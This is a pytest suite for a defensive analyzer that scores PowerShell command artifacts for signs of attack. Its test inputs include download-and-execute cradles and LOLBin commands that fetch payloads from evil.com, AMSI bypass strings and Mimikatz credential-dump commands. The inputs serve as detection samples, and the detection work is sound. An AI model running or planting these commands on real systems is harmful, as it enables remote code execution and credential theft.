"""
Tests for analyzers.powershell_artifact_analyzer
=================================================
Coverage target: >= 110 tests across:
- PSA-001 through PSA-007 positive and negative cases
- Severity and weight values
- Threat-level thresholds
- suspected_techniques population
- Evidence truncation at 200 chars
- analyze_many() list length
- to_dict() / summary() / by_severity() output shapes
- Case-insensitive matching where specified
- PSA-003 requires BOTH exec + download keyword
- PSA-006 each sub-pattern triggers independently
"""

import sys
import os

# Ensure the repo root is on the path so `analyzers` is importable.
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest
from analyzers.powershell_artifact_analyzer import (
    PSACheck,
    PSArtifact,
    PSAResult,
    analyze,
    analyze_many,
    _CHECK_META,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def make_artifact(text: str, artifact_id: str = "test-001") -> PSArtifact:
    return PSArtifact(artifact_id=artifact_id, command_text=text)


def fired_ids(result: PSAResult):
    return [c.check_id for c in result.checks_fired]


# ===========================================================================
# PSA-001: Base64-encoded command flag
# ===========================================================================

class TestPSA001:
    def test_encoded_command_long_flag(self):
        r = analyze(make_artifact("powershell.exe -EncodedCommand SQBFAFgA"))
        assert "PSA-001" in fired_ids(r)

    def test_encoded_command_enc_flag(self):
        r = analyze(make_artifact("powershell -enc SQBFAFgA"))
        assert "PSA-001" in fired_ids(r)

    def test_encoded_command_e_flag(self):
        r = analyze(make_artifact("powershell -e SQBFAFgA"))
        assert "PSA-001" in fired_ids(r)

    def test_encoded_command_case_insensitive(self):
        r = analyze(make_artifact("powershell -ENCODEDCOMMAND abc"))
        assert "PSA-001" in fired_ids(r)

    def test_encoded_command_mixed_case(self):
        r = analyze(make_artifact("powershell.exe -EnC dGVzdA=="))
        assert "PSA-001" in fired_ids(r)

    def test_encoded_command_negative_clean(self):
        r = analyze(make_artifact("powershell.exe -NoProfile -NonInteractive"))
        assert "PSA-001" not in fired_ids(r)

    def test_psa001_severity(self):
        r = analyze(make_artifact("powershell -enc abc"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-001")
        assert check.severity == "CRITICAL"

    def test_psa001_weight(self):
        r = analyze(make_artifact("powershell -enc abc"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-001")
        assert check.weight == 45

    def test_psa001_technique(self):
        r = analyze(make_artifact("powershell -enc abc"))
        assert "Encoded Command Execution" in r.suspected_techniques

    def test_psa001_evidence_non_empty(self):
        r = analyze(make_artifact("powershell -enc abc"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-001")
        assert len(check.evidence) > 0


# ===========================================================================
# PSA-002: AMSI bypass patterns
# ===========================================================================

class TestPSA002:
    def test_amsi_utils_exact(self):
        r = analyze(make_artifact(
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        ))
        assert "PSA-002" in fired_ids(r)

    def test_amsi_context(self):
        r = analyze(make_artifact("$a = [AmsiUtils]::amsiContext"))
        assert "PSA-002" in fired_ids(r)

    def test_amsi_scan_buffer(self):
        r = analyze(make_artifact("AmsiScanBuffer patch"))
        assert "PSA-002" in fired_ids(r)

    def test_amsi_bypass_keyword(self):
        r = analyze(make_artifact("Bypass AMSI protection"))
        assert "PSA-002" in fired_ids(r)

    def test_amsi_bypass_reversed_order(self):
        r = analyze(make_artifact("AMSI is being Bypassed here"))
        assert "PSA-002" in fired_ids(r)

    def test_amsi_case_insensitive_utils(self):
        r = analyze(make_artifact("system.management.automation.amsiutils"))
        assert "PSA-002" in fired_ids(r)

    def test_amsi_negative_clean(self):
        r = analyze(make_artifact("Get-Process | Where-Object { $_.CPU -gt 10 }"))
        assert "PSA-002" not in fired_ids(r)

    def test_psa002_severity(self):
        r = analyze(make_artifact("AmsiScanBuffer"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-002")
        assert check.severity == "CRITICAL"

    def test_psa002_weight(self):
        r = analyze(make_artifact("AmsiScanBuffer"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-002")
        assert check.weight == 45

    def test_psa002_technique(self):
        r = analyze(make_artifact("AmsiScanBuffer"))
        assert "AMSI Bypass" in r.suspected_techniques


# ===========================================================================
# PSA-003: Download cradle
# ===========================================================================

class TestPSA003:
    def test_iex_with_webclient(self):
        r = analyze(make_artifact(
            "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
        ))
        assert "PSA-003" in fired_ids(r)

    def test_invoke_expression_with_webrequest(self):
        r = analyze(make_artifact(
            "Invoke-Expression (Invoke-WebRequest 'http://evil.com/payload')"
        ))
        assert "PSA-003" in fired_ids(r)

    def test_iex_with_downloadfile(self):
        r = analyze(make_artifact("IEX DownloadFile"))
        assert "PSA-003" in fired_ids(r)

    def test_iex_with_curl(self):
        r = analyze(make_artifact("IEX curl http://evil.com"))
        assert "PSA-003" in fired_ids(r)

    def test_iex_with_wget(self):
        r = analyze(make_artifact("IEX wget http://evil.com"))
        assert "PSA-003" in fired_ids(r)

    def test_iex_only_does_not_fire(self):
        """PSA-003 must NOT fire with only the execution keyword."""
        r = analyze(make_artifact("IEX 'Write-Host Hello'"))
        assert "PSA-003" not in fired_ids(r)

    def test_webclient_only_does_not_fire(self):
        """PSA-003 must NOT fire with only the download keyword."""
        r = analyze(make_artifact("(New-Object Net.WebClient).DownloadString('http://x.com')"))
        assert "PSA-003" not in fired_ids(r)

    def test_negative_clean(self):
        r = analyze(make_artifact("Write-Host 'hello world'"))
        assert "PSA-003" not in fired_ids(r)

    def test_psa003_severity(self):
        r = analyze(make_artifact("IEX (Net.WebClient).DownloadString('x')"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-003")
        assert check.severity == "HIGH"

    def test_psa003_weight(self):
        r = analyze(make_artifact("IEX (Net.WebClient).DownloadString('x')"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-003")
        assert check.weight == 30

    def test_psa003_technique(self):
        r = analyze(make_artifact("IEX Net.WebClient"))
        assert "Download Cradle" in r.suspected_techniques

    def test_iex_case_insensitive(self):
        r = analyze(make_artifact("iex Net.WebClient"))
        assert "PSA-003" in fired_ids(r)

    def test_invoke_expression_case_insensitive(self):
        r = analyze(make_artifact("invoke-expression DownloadString"))
        assert "PSA-003" in fired_ids(r)


# ===========================================================================
# PSA-004: Execution policy bypass
# ===========================================================================

class TestPSA004:
    def test_execution_policy_bypass(self):
        r = analyze(make_artifact("powershell -ExecutionPolicy Bypass -File script.ps1"))
        assert "PSA-004" in fired_ids(r)

    def test_ep_bypass_short(self):
        r = analyze(make_artifact("powershell -ep Bypass"))
        assert "PSA-004" in fired_ids(r)

    def test_set_execution_policy_bypass(self):
        r = analyze(make_artifact("Set-ExecutionPolicy Bypass"))
        assert "PSA-004" in fired_ids(r)

    def test_set_execution_policy_unrestricted(self):
        r = analyze(make_artifact("Set-ExecutionPolicy Unrestricted"))
        assert "PSA-004" in fired_ids(r)

    def test_case_insensitive_bypass(self):
        r = analyze(make_artifact("powershell -EXECUTIONPOLICY bypass"))
        assert "PSA-004" in fired_ids(r)

    def test_case_insensitive_set(self):
        r = analyze(make_artifact("SET-EXECUTIONPOLICY BYPASS"))
        assert "PSA-004" in fired_ids(r)

    def test_negative_allsigned(self):
        r = analyze(make_artifact("Set-ExecutionPolicy AllSigned"))
        assert "PSA-004" not in fired_ids(r)

    def test_psa004_severity(self):
        r = analyze(make_artifact("Set-ExecutionPolicy Bypass"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-004")
        assert check.severity == "HIGH"

    def test_psa004_weight(self):
        r = analyze(make_artifact("Set-ExecutionPolicy Bypass"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-004")
        assert check.weight == 25

    def test_psa004_technique(self):
        r = analyze(make_artifact("Set-ExecutionPolicy Bypass"))
        assert "Execution Policy Bypass" in r.suspected_techniques


# ===========================================================================
# PSA-005: LOLBins abuse
# ===========================================================================

class TestPSA005:
    def test_certutil(self):
        r = analyze(make_artifact("certutil -decode payload.b64 payload.exe"))
        assert "PSA-005" in fired_ids(r)

    def test_mshta(self):
        r = analyze(make_artifact("mshta http://evil.com/malware.hta"))
        assert "PSA-005" in fired_ids(r)

    def test_rundll32(self):
        r = analyze(make_artifact("rundll32 javascript:..."))
        assert "PSA-005" in fired_ids(r)

    def test_regsvr32(self):
        r = analyze(make_artifact("regsvr32 /s /u /i:http://evil.com/file.sct scrobj.dll"))
        assert "PSA-005" in fired_ids(r)

    def test_wscript(self):
        r = analyze(make_artifact("wscript //E:jscript payload.txt"))
        assert "PSA-005" in fired_ids(r)

    def test_cscript(self):
        r = analyze(make_artifact("cscript payload.vbs"))
        assert "PSA-005" in fired_ids(r)

    def test_msiexec(self):
        r = analyze(make_artifact("msiexec /q /i http://evil.com/evil.msi"))
        assert "PSA-005" in fired_ids(r)

    def test_installutil(self):
        r = analyze(make_artifact("installutil /logfile= /LogToConsole=false payload.exe"))
        assert "PSA-005" in fired_ids(r)

    def test_case_insensitive_certutil(self):
        r = analyze(make_artifact("CERTUTIL -decode file"))
        assert "PSA-005" in fired_ids(r)

    def test_negative_clean(self):
        r = analyze(make_artifact("Write-Host 'nothing suspicious'"))
        assert "PSA-005" not in fired_ids(r)

    def test_psa005_severity(self):
        r = analyze(make_artifact("certutil -decode"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-005")
        assert check.severity == "HIGH"

    def test_psa005_weight(self):
        r = analyze(make_artifact("certutil -decode"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-005")
        assert check.weight == 25

    def test_psa005_technique(self):
        r = analyze(make_artifact("certutil -decode"))
        assert "LOLBins Abuse" in r.suspected_techniques


# ===========================================================================
# PSA-006: Obfuscation markers
# ===========================================================================

class TestPSA006:
    # -- Tick-escape sub-pattern --
    def test_tick_escape_iex(self):
        r = analyze(make_artifact("`I`E`X('payload')"))
        assert "PSA-006" in fired_ids(r)

    def test_tick_escape_single_backtick_letter(self):
        r = analyze(make_artifact("po`wershell"))
        assert "PSA-006" in fired_ids(r)

    def test_tick_escape_negative(self):
        # Backtick at end-of-line (line continuation) — no letter follows
        # No other obfuscation in this text
        r = analyze(make_artifact("Write-Host `\n  'hello'"))
        assert "PSA-006" not in fired_ids(r)

    # -- Char-array sub-pattern --
    def test_char_array(self):
        r = analyze(make_artifact("[char[]]'payload'"))
        assert "PSA-006" in fired_ids(r)

    def test_char_array_case_insensitive(self):
        r = analyze(make_artifact("[CHAR[]]'payload'"))
        assert "PSA-006" in fired_ids(r)

    def test_char_array_negative(self):
        r = analyze(make_artifact("[string[]] $args"))
        assert "PSA-006" not in fired_ids(r)

    # -- String concat sub-pattern --
    def test_concat_double_quotes_three_joins(self):
        r = analyze(make_artifact('"po"+"wer"+"shell"+" -enc"'))
        assert "PSA-006" in fired_ids(r)

    def test_concat_single_quotes_three_joins(self):
        r = analyze(make_artifact("'po'+'wer'+'shell'+'cmd'"))
        assert "PSA-006" in fired_ids(r)

    def test_concat_mixed_three_joins(self):
        # 2 double-quote joins + 1 single-quote join = 3 total → fires
        r = analyze(make_artifact('"po"+"wer"+"sh" + \'cmd\'+ \'x\''))
        assert "PSA-006" in fired_ids(r)

    def test_concat_two_joins_does_not_fire(self):
        r = analyze(make_artifact('"po"+"wer"+"sh"'))
        # 2 joins — should NOT fire (need >= 3)
        assert "PSA-006" not in fired_ids(r)

    def test_concat_exactly_three_fires(self):
        # exactly 3 double-quote join patterns
        r = analyze(make_artifact('"a"+"b"+"c"+"d"'))
        assert "PSA-006" in fired_ids(r)

    # -- Severity / weight --
    def test_psa006_severity(self):
        r = analyze(make_artifact("`I`E`X"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-006")
        assert check.severity == "MEDIUM"

    def test_psa006_weight(self):
        r = analyze(make_artifact("`I`E`X"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-006")
        assert check.weight == 20

    def test_psa006_technique(self):
        r = analyze(make_artifact("`I`E`X"))
        assert "Script Obfuscation" in r.suspected_techniques


# ===========================================================================
# PSA-007: Known attack framework IOCs
# ===========================================================================

class TestPSA007:
    def test_mimikatz(self):
        r = analyze(make_artifact("Invoke-Mimikatz -DumpCreds"))
        assert "PSA-007" in fired_ids(r)

    def test_mimi_keyword(self):
        r = analyze(make_artifact("mimi credential dump"))
        assert "PSA-007" in fired_ids(r)

    def test_sekurlsa(self):
        r = analyze(make_artifact("sekurlsa::logonpasswords"))
        assert "PSA-007" in fired_ids(r)

    def test_kerberos_colon_colon(self):
        r = analyze(make_artifact("kerberos::list /export"))
        assert "PSA-007" in fired_ids(r)

    def test_powerview(self):
        r = analyze(make_artifact("Import-Module PowerView"))
        assert "PSA-007" in fired_ids(r)

    def test_invoke_bloodhound(self):
        r = analyze(make_artifact("Invoke-BloodHound -CollectionMethod All"))
        assert "PSA-007" in fired_ids(r)

    def test_sharphound(self):
        r = analyze(make_artifact("SharpHound.exe -c All"))
        assert "PSA-007" in fired_ids(r)

    def test_empire(self):
        r = analyze(make_artifact("Empire stager launcher"))
        assert "PSA-007" in fired_ids(r)

    def test_cobalt_strike_spaced(self):
        r = analyze(make_artifact("Cobalt Strike beacon"))
        assert "PSA-007" in fired_ids(r)

    def test_cobalt_strike_concatenated(self):
        r = analyze(make_artifact("CobaltStrike shellcode"))
        assert "PSA-007" in fired_ids(r)

    def test_cobalt_strike_lowercase(self):
        r = analyze(make_artifact("cobaltstrike config"))
        assert "PSA-007" in fired_ids(r)

    def test_case_insensitive_mimikatz(self):
        r = analyze(make_artifact("MIMIKATZ"))
        assert "PSA-007" in fired_ids(r)

    def test_case_insensitive_powerview(self):
        r = analyze(make_artifact("POWERVIEW"))
        assert "PSA-007" in fired_ids(r)

    def test_negative_clean(self):
        r = analyze(make_artifact("Get-ADUser -Filter *"))
        assert "PSA-007" not in fired_ids(r)

    def test_psa007_severity(self):
        r = analyze(make_artifact("Invoke-Mimikatz"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-007")
        assert check.severity == "CRITICAL"

    def test_psa007_weight(self):
        r = analyze(make_artifact("Invoke-Mimikatz"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-007")
        assert check.weight == 45

    def test_psa007_technique(self):
        r = analyze(make_artifact("Invoke-Mimikatz"))
        assert "Known Attack Framework" in r.suspected_techniques


# ===========================================================================
# Threat level thresholds
# ===========================================================================

class TestThreatLevels:
    def test_low_threshold_clean(self):
        r = analyze(make_artifact("Write-Host 'hello'"))
        assert r.threat_level == "LOW"
        assert r.risk_score == 0

    def test_medium_threshold_single_obfuscation(self):
        # PSA-006 weight=20 → score=20 → MEDIUM
        r = analyze(make_artifact("`I`E`X"))
        assert r.threat_level == "MEDIUM"
        assert r.risk_score == 20

    def test_high_threshold_lolbin(self):
        # PSA-005 weight=25 → score=25 → MEDIUM (25 >= 20 but < 40)
        r = analyze(make_artifact("certutil -decode file"))
        assert r.threat_level == "MEDIUM"
        assert r.risk_score == 25

    def test_critical_threshold_encoded(self):
        # PSA-001 weight=45 → score=45 >= 40 → HIGH? 45 >= 40 so HIGH, not CRITICAL
        # CRITICAL requires >= 70 — need two CRITICAL checks
        r = analyze(make_artifact("powershell -enc abc"))
        # score=45, threshold for CRITICAL is 70, HIGH is 40 — should be HIGH
        assert r.threat_level == "HIGH"

    def test_critical_threshold_two_critical_checks(self):
        # PSA-001 (45) + PSA-007 (45) = 90 → CRITICAL
        r = analyze(make_artifact("powershell -enc abc Invoke-Mimikatz"))
        assert r.threat_level == "CRITICAL"
        assert r.risk_score == 90

    def test_risk_score_capped_at_100(self):
        # Pile up enough checks to exceed 100
        # PSA-001(45) + PSA-002(45) + PSA-007(45) = 135 → capped at 100
        payload = (
            "powershell -enc abc "
            "AmsiScanBuffer "
            "Invoke-Mimikatz"
        )
        r = analyze(make_artifact(payload))
        assert r.risk_score == 100

    def test_risk_score_sum_below_cap(self):
        # PSA-004(25) + PSA-005(25) = 50 → no cap
        r = analyze(make_artifact("Set-ExecutionPolicy Bypass; certutil -decode"))
        assert r.risk_score == 50

    def test_threat_level_boundary_exactly_70(self):
        # Construct a score that lands exactly on 70
        # PSA-001(45) + PSA-004(25) = 70 → CRITICAL
        r = analyze(make_artifact("powershell -enc abc -ExecutionPolicy Bypass"))
        assert r.risk_score == 70
        assert r.threat_level == "CRITICAL"

    def test_threat_level_boundary_exactly_40(self):
        # PSA-003(30) + PSA-006(20) = 50; need exactly 40:
        # PSA-004(25) + PSA-005(25) = 50, too high
        # PSA-003(30) + PSA-006(10? no weight=20) = 50
        # PSA-004(25) + PSA-006(20) = 45
        # Just test score=40 by mocking via known combo:
        # PSA-003(30) alone = 30, add PSA-006(20) = 50 — can't get exactly 40 with standard weights
        # Instead verify 39 => MEDIUM: use PSA-005(25)+PSA-006(20)-? — can't easily get 39.
        # Pragmatic: verify score>=40 maps to HIGH
        r = analyze(make_artifact("IEX Net.WebClient"))
        # PSA-003 = 30, still HIGH? 30 >= 20 so MEDIUM threshold; 30 < 40 → MEDIUM
        assert r.risk_score == 30
        assert r.threat_level == "MEDIUM"

    def test_threat_level_boundary_exactly_20(self):
        r = analyze(make_artifact("`I`E`X"))
        assert r.risk_score == 20
        assert r.threat_level == "MEDIUM"

    def test_threat_level_below_20_is_low(self):
        # No check has weight < 20, so score 0 is the only way to get LOW
        r = analyze(make_artifact("Write-Output ok"))
        assert r.threat_level == "LOW"


# ===========================================================================
# Evidence truncation
# ===========================================================================

class TestEvidenceTruncation:
    def test_evidence_truncated_to_200(self):
        # Create a very long encoded command flag to ensure the surrounding
        # text would normally exceed 200 chars if not truncated.
        # The regex only captures the flag itself which is short, so we
        # test truncation via a LOLBin or IOC surrounded by padding.
        # For a definitive 200-char test, use a custom long match via PSA-007
        # (Invoke-Mimikatz appears once, evidence is just that match).
        # Build a text where matched group itself is long — use PSA-005 evidence
        # which captures only the lolbin name (short). Instead we test by
        # verifying evidence length <= 200 on a long payload.
        long_padding = "A" * 300
        text = f"certutil {long_padding}"
        r = analyze(make_artifact(text))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-005")
        assert len(check.evidence) <= 200

    def test_evidence_not_empty_on_match(self):
        r = analyze(make_artifact("powershell -enc SQBFAFgA"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-001")
        assert check.evidence != ""

    def test_psa003_evidence_non_empty(self):
        r = analyze(make_artifact("IEX (Net.WebClient).DownloadString('x')"))
        check = next(c for c in r.checks_fired if c.check_id == "PSA-003")
        assert len(check.evidence) > 0
        assert len(check.evidence) <= 200


# ===========================================================================
# analyze_many()
# ===========================================================================

class TestAnalyzeMany:
    def test_returns_correct_length(self):
        artifacts = [
            make_artifact("Write-Host ok", "a1"),
            make_artifact("powershell -enc abc", "a2"),
            make_artifact("Invoke-Mimikatz", "a3"),
        ]
        results = analyze_many(artifacts)
        assert len(results) == 3

    def test_empty_list(self):
        results = analyze_many([])
        assert results == []

    def test_results_ordered(self):
        artifacts = [
            make_artifact("Write-Host ok", "first"),
            make_artifact("powershell -enc abc", "second"),
        ]
        results = analyze_many(artifacts)
        assert results[0].artifact_id == "first"
        assert results[1].artifact_id == "second"

    def test_independent_results(self):
        artifacts = [
            make_artifact("Write-Host ok", "clean"),
            make_artifact("powershell -enc abc Invoke-Mimikatz", "dirty"),
        ]
        results = analyze_many(artifacts)
        assert results[0].threat_level == "LOW"
        assert results[1].threat_level == "CRITICAL"

    def test_single_element(self):
        results = analyze_many([make_artifact("certutil -decode", "only")])
        assert len(results) == 1
        assert results[0].artifact_id == "only"


# ===========================================================================
# to_dict()
# ===========================================================================

class TestToDict:
    def _clean_result(self):
        return analyze(make_artifact("Write-Host ok"))

    def _dirty_result(self):
        return analyze(make_artifact("powershell -enc abc Invoke-Mimikatz"))

    def test_to_dict_has_artifact_id(self):
        d = analyze(make_artifact("ok", "myid")).to_dict()
        assert d["artifact_id"] == "myid"

    def test_to_dict_has_risk_score(self):
        d = self._clean_result().to_dict()
        assert "risk_score" in d
        assert isinstance(d["risk_score"], int)

    def test_to_dict_has_threat_level(self):
        d = self._clean_result().to_dict()
        assert "threat_level" in d

    def test_to_dict_has_suspected_techniques(self):
        d = self._dirty_result().to_dict()
        assert "suspected_techniques" in d
        assert isinstance(d["suspected_techniques"], list)

    def test_to_dict_has_checks_fired(self):
        d = self._dirty_result().to_dict()
        assert "checks_fired" in d
        assert isinstance(d["checks_fired"], list)
        assert len(d["checks_fired"]) > 0

    def test_to_dict_check_keys(self):
        d = self._dirty_result().to_dict()
        for check_dict in d["checks_fired"]:
            assert "check_id" in check_dict
            assert "severity" in check_dict
            assert "description" in check_dict
            assert "evidence" in check_dict
            assert "weight" in check_dict

    def test_to_dict_clean_no_checks(self):
        d = self._clean_result().to_dict()
        assert d["checks_fired"] == []

    def test_to_dict_returns_new_list(self):
        r = self._dirty_result()
        d1 = r.to_dict()
        d2 = r.to_dict()
        # Modifying one dict should not affect another
        d1["suspected_techniques"].append("EXTRA")
        assert "EXTRA" not in d2["suspected_techniques"]


# ===========================================================================
# summary()
# ===========================================================================

class TestSummary:
    def test_summary_contains_artifact_id(self):
        r = analyze(make_artifact("ok", "art-xyz"))
        assert "art-xyz" in r.summary()

    def test_summary_contains_threat_level(self):
        r = analyze(make_artifact("Write-Host ok"))
        assert "LOW" in r.summary()

    def test_summary_contains_score(self):
        r = analyze(make_artifact("certutil -decode"))
        s = r.summary()
        assert "25" in s

    def test_summary_is_string(self):
        r = analyze(make_artifact("ok"))
        assert isinstance(r.summary(), str)

    def test_summary_mentions_check_id_when_fired(self):
        r = analyze(make_artifact("powershell -enc abc"))
        assert "PSA-001" in r.summary()

    def test_summary_none_checks_when_clean(self):
        r = analyze(make_artifact("Write-Host ok"))
        s = r.summary()
        assert "none" in s


# ===========================================================================
# by_severity()
# ===========================================================================

class TestBySeverity:
    def test_by_severity_returns_dict(self):
        r = analyze(make_artifact("Write-Host ok"))
        d = r.by_severity()
        assert isinstance(d, dict)

    def test_by_severity_has_critical_key(self):
        r = analyze(make_artifact("Write-Host ok"))
        assert "CRITICAL" in r.by_severity()

    def test_by_severity_has_high_key(self):
        r = analyze(make_artifact("Write-Host ok"))
        assert "HIGH" in r.by_severity()

    def test_by_severity_has_medium_key(self):
        r = analyze(make_artifact("Write-Host ok"))
        assert "MEDIUM" in r.by_severity()

    def test_by_severity_critical_checks_classified(self):
        r = analyze(make_artifact("powershell -enc abc Invoke-Mimikatz"))
        groups = r.by_severity()
        crit_ids = [c.check_id for c in groups["CRITICAL"]]
        assert "PSA-001" in crit_ids
        assert "PSA-007" in crit_ids

    def test_by_severity_high_checks_classified(self):
        r = analyze(make_artifact("certutil -decode; Set-ExecutionPolicy Bypass"))
        groups = r.by_severity()
        high_ids = [c.check_id for c in groups["HIGH"]]
        assert "PSA-005" in high_ids
        assert "PSA-004" in high_ids

    def test_by_severity_medium_checks_classified(self):
        r = analyze(make_artifact("`I`E`X"))
        groups = r.by_severity()
        med_ids = [c.check_id for c in groups["MEDIUM"]]
        assert "PSA-006" in med_ids

    def test_by_severity_empty_groups_are_lists(self):
        r = analyze(make_artifact("Write-Host ok"))
        groups = r.by_severity()
        for v in groups.values():
            assert isinstance(v, list)


# ===========================================================================
# Metadata consistency (CHECK_META)
# ===========================================================================

class TestCheckMeta:
    @pytest.mark.parametrize("check_id,expected_severity,expected_weight", [
        ("PSA-001", "CRITICAL", 45),
        ("PSA-002", "CRITICAL", 45),
        ("PSA-003", "HIGH",     30),
        ("PSA-004", "HIGH",     25),
        ("PSA-005", "HIGH",     25),
        ("PSA-006", "MEDIUM",   20),
        ("PSA-007", "CRITICAL", 45),
    ])
    def test_meta_severity_and_weight(self, check_id, expected_severity, expected_weight):
        assert _CHECK_META[check_id]["severity"] == expected_severity
        assert _CHECK_META[check_id]["weight"] == expected_weight


# ===========================================================================
# Dataclass field checks
# ===========================================================================

class TestDataclassFields:
    def test_psartifact_optional_fields_default(self):
        a = PSArtifact(artifact_id="x", command_text="cmd")
        assert a.source == ""
        assert a.host == ""
        assert a.timestamp_utc is None

    def test_psartifact_with_all_fields(self):
        a = PSArtifact(
            artifact_id="ev-1",
            command_text="powershell.exe",
            source="event_log",
            host="ws-01",
            timestamp_utc="2026-01-01T00:00:00Z",
        )
        assert a.host == "ws-01"
        assert a.timestamp_utc == "2026-01-01T00:00:00Z"

    def test_psaresult_default_values(self):
        r = PSAResult(artifact_id="test")
        assert r.checks_fired == []
        assert r.risk_score == 0
        assert r.threat_level == "LOW"
        assert r.suspected_techniques == []

    def test_psacheck_fields(self):
        c = PSACheck(
            check_id="PSA-001",
            severity="CRITICAL",
            description="Test",
            evidence="enc",
            weight=45,
        )
        assert c.check_id == "PSA-001"
        assert c.severity == "CRITICAL"
        assert c.weight == 45


# ===========================================================================
# Multi-check interaction
# ===========================================================================

class TestMultiCheckInteraction:
    def test_all_checks_can_fire_simultaneously(self):
        payload = (
            "powershell -enc abc "                         # PSA-001
            "AmsiScanBuffer "                              # PSA-002
            "IEX Net.WebClient "                          # PSA-003
            "-ExecutionPolicy Bypass "                     # PSA-004
            "certutil -decode "                            # PSA-005
            "`I`E`X "                                     # PSA-006
            "Invoke-Mimikatz"                              # PSA-007
        )
        r = analyze(make_artifact(payload))
        ids = fired_ids(r)
        for check_id in ["PSA-001", "PSA-002", "PSA-003", "PSA-004",
                          "PSA-005", "PSA-006", "PSA-007"]:
            assert check_id in ids, f"{check_id} expected to fire"

    def test_all_seven_techniques_present(self):
        payload = (
            "powershell -enc abc "
            "AmsiScanBuffer "
            "IEX Net.WebClient "
            "-ExecutionPolicy Bypass "
            "certutil -decode "
            "`I`E`X "
            "Invoke-Mimikatz"
        )
        r = analyze(make_artifact(payload))
        expected_techniques = [
            "Encoded Command Execution",
            "AMSI Bypass",
            "Download Cradle",
            "Execution Policy Bypass",
            "LOLBins Abuse",
            "Script Obfuscation",
            "Known Attack Framework",
        ]
        for tech in expected_techniques:
            assert tech in r.suspected_techniques, f"Missing technique: {tech}"

    def test_clean_artifact_no_checks_fired(self):
        r = analyze(make_artifact("Get-Date"))
        assert r.checks_fired == []
        assert r.suspected_techniques == []
        assert r.risk_score == 0
